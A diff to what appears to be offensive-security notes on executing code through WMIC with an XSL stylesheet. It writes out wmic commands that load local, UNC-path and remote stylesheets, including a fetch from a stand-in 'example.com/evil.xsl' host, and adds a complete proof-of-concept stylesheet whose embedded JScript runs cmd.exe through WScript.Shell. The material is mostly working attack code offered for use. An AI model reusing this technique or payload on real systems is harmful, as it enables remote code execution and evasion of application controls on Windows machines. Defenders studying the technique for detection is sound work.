@@ -20,6 +20,20 @@ OR:
 wmic process get brief /format:"C:\Users\WMI\poc-wmic.xsl" 
 wmic process LIST /FORMAT:"\\127.0.0.1\c$\Users\WMI\poc-wmic.xsl"
 
+#cat poc-wmic.xsl:
+                  <?xml version='1.0'?>
+                    <stylesheet
+                    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+                    xmlns:user="placeholder"
+                    version="1.0">
+                      <output method="text"/>
+                        <ms:script implements-prefix="user" language="JScript">
+                          <![CDATA[
+                            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k echo 'Tapz!'");
+                          ]]> </ms:script>
+                  </stylesheet>
+
+
 Remote File example:
 wmic os get /FORMAT:"https://example.com/evil.xsl"
 
